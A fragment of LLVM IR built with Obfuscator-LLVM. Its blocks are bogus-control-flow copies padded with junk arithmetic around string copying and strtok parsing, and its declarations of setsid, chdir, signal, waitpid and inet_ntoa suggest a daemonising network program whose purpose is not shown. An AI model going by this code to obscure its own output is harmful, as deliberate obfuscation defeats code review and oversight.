  %840 = load i8*, i8** %28, align 8
  %841 = icmp ne i8* %840, null
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %579
  %842 = load i8*, i8** %28, align 8
  %843 = load i8, i8* %842, align 1
  %844 = zext i8 %843 to i32
  %845 = icmp ne i32 %844, 10
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %600
  %846 = load i8*, i8** %28, align 8
  %847 = call i64 @strlen(i8* %846) #10
  %_119 = shl i64 %847, 1
  %_120 = sub i64 %847, 1
  %gen121 = mul i64 %_120, 1
  %_122 = shl i64 %847, 1
  %848 = add i64 %847, 1
  %849 = call noalias i8* @malloc(i64 %848) #6
  %850 = load i32, i32* %27, align 4
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i64 0, i64 %851
  store i8* %849, i8** %852, align 8
  %853 = load i32, i32* %27, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i64 0, i64 %854
  %856 = load i8*, i8** %855, align 8
  %857 = load i8*, i8** %28, align 8
  %858 = call i64 @strlen(i8* %857) #10
  %_123 = shl i64 %858, 1
  %_124 = sub i64 %858, 1
  %gen125 = mul i64 %_124, 1
  %_126 = sub i64 %858, 1
  %gen127 = mul i64 %_126, 1
  %_128 = shl i64 %858, 1
  %859 = add i64 %858, 1
  call void @llvm.memset.p0i8.i64(i8* %856, i8 0, i64 %859, i32 1, i1 false)
  %860 = load i32, i32* %27, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds [10 x i8*], [10 x i8*]* %26, i64 0, i64 %861
  %863 = load i8*, i8** %862, align 8
  %864 = load i8*, i8** %28, align 8
  %865 = call i8* @strcpy(i8* %863, i8* %864) #6
  %866 = load i32, i32* %27, align 4
  %_129 = sub i32 0, %866
  %gen130 = add i32 %_129, 1
  %_131 = sub i32 0, %866
  %gen132 = add i32 %_131, 1
  %_133 = sub i32 %866, 1
  %gen134 = mul i32 %_133, 1
  %_135 = shl i32 %866, 1
  %_136 = shl i32 %866, 1
  %867 = add nsw i32 %866, 1
  store i32 %867, i32* %27, align 4
  br label %originalBB118

originalBB140alteredBB:                           ; preds = %originalBB140, %639
  %868 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.35, i32 0, i32 0)) #6
  store i8* %868, i8** %28, align 8
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %672
  %869 = load i32, i32* %29, align 4
  %_145 = sub i32 %869, 1
  %gen146 = mul i32 %_145, 1
  %_147 = sub i32 %869, 1
  %gen148 = mul i32 %_147, 1
  %870 = add nsw i32 %869, 1
  store i32 %870, i32* %29, align 4
  br label %originalBB144

originalBB152alteredBB:                           ; preds = %originalBB152, %691
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %710
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %727
  %871 = load i32, i32* %11, align 4
  br label %originalBB160
}

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #2

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146658232}
!2 = !{i32 -2146657541}
!3 = !{i32 -2146656792}
